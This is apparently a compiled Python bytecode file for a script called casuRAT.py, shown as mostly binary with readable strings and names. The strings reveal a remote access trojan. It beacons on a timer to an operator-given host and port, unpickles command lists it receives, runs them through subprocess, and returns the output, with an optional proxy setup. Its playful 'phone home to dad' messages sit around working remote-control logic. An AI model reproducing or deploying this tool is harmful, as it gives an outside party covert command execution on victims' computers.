B
    Q B`�
  �               @   s�  d dl Z d dlZd dlZd dlZd dlZd dlZee j�dkrZede jd  d� e �	d� e jdd� \Z
ZZee�Ze
ee�fZdd� Zx�ed�Ze�� d	k�rLed
�Zed�Zed�Zed�Zed�Zed e d e d e d e Zede� ed�Ze�� d	k�rBeejd< eejd< eejd< eejd< ed� P ned� q�e�� dk�rfed� P q�ed� q�W xe�  e�e� �qtW dS )�    N�   zusage:z)<rhost> <rport> <beacon_interval_seconds>�   c              C   s&  t � t jt j�} y| �t� W n t jk
r<   td� Y n�X y| �d�}W n  tpVt	k
rl   td� Y n�X t
�|�}|dks�d r�| ��  | j d } td� d S x`|dd � D ]P}|�d�}ytj|tjtjdd	�}W n   t Y q�X t
�|j�}| �|� q�W td
|d� | ��  | j d } d S )NzDad isn't home...i   zDad hung up on me...ZrefusedzDad isn't speaking with me...r   � T)�stdout�stderr�textzTold dad all about�!)�socketZAF_INETZSOCK_STREAMZconnect�rserver�error�printZrecv�ConnectionResetError�EOFError�pickle�loads�closeZshutdown�split�
subprocess�run�PIPEZSTDOUT�FileNotFoundError�dumpsr   Zsendall)�s�data�cmd�cZcmdargZexecuteZjar� r   �
casuRAT.py�
phone_home   s:    


r   z;Would you like to push traffic through a web proxy (y/n)?: )�yZyesz$What is the protocol (http/https)?: z*What is the username?, if none hit enter: z*What is the password?, if none hit enter: z What is the proxy address/URL?: zWhat is the proxy port?: z//�:�@�
z$Does the above look correct (y/n)?: Z
http_proxyZ
HTTP_PROXYZhttps_proxyZHTTPS_PROXYzProxy environment setzLet's try again.)�nZnozskipping proxy set upzTry again...)�sysr	   r   Ztimer   �os�len�argvr   �exitZrhostZrport�wait�intr
   r   �inputZprox_ask�lowerZ	prox_protZ	prox_userZ	prox_passZprox_urlZ	prox_port�proxyZ	prox_conf�environZsleepr   r   r   r   �<module>   sL   
&$





